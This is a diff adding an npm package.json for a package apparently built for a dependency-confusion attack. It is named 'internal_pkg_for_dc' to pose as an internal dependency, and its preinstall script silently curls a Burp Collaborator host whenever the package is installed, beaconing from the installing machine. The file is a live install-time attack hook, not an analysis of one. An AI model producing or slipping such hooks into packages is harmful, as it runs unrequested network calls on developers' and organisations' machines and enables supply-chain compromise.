@@ -1,0 +1,15 @@
+{
+  "name": "internal_pkg_for_dc",
+  "version": "1.0.3",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "preinstall":"curl https://yhjkr0xfl9emwhtktxxp46v68xep2e.burpcollaborator.net/test",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [
+    "chawla"
+  ],
+  "author": "",
+  "license": "ISC"
+}
